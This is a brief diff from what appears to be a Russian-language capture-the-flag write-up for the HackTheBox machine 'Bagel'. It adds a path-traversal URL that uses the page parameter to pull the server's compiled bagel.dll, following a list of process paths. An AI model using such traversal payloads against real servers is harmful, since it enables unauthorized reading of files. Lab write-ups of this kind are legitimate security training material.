@@ -213,3 +213,4 @@ dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 926
 dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 924
 ```
 и пытаюсь выгрузить его
+Путь к файлу: http://bagel.htb:8000/?page=../../../../../../../dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
